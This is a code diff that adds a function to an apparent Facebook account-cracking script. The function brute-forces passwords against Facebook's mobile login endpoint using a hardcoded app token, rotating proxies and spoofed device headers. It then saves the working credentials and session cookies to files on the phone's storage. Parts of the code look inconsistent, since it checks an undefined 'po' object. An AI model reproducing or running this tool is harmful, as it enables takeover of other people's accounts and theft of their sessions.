@@ -1349,6 +1349,59 @@ def crackmobile(idf,pwv):
 				continue
 		except requests.exceptions.ConnectionError:
 			waktu(31)
+def reguler2(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
+	ua = random.choice(uaa)
+	ses = requests.Session()
+	prog.update(des,description=f"[bold green]B-Api[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.advance(des) 
+	for pw in pwv:
+		try:
+			if 'ya' in ualuh: ua = ualu[0]
+			nip=random.choice(prox)
+			proxs= {'http': 'socks5://'+nip}
+			params = {
+				"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
+				"sdk_version": {random.randint(1,26)}, 
+				"email": idf,
+				"locale": "en_US",
+				"password": pw,
+				"sdk": "android",
+				"generate_session_cookies": "1",
+				"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+			}
+			headers = {
+				"Host": "graph.facebook.com",
+				"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+				"x-fb-sim-hni": str(random.randint(20000, 40000)),
+				"x-fb-net-hni": str(random.randint(20000, 40000)),
+				"x-fb-connection-quality": "EXCELLENT",
+				"user-agent": ua,
+				"content-type": "application/x-www-form-urlencoded",
+				"x-fb-http-engine": "Liger"
+			}
+			post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
+				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				kukis = kuki.replace(f'c_user={idf};datr','sb')
+				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
+				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				break
+
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 	loop+=1
 if __name__=='__main__':
 	try:os.mkdir('/sdcard/OK')
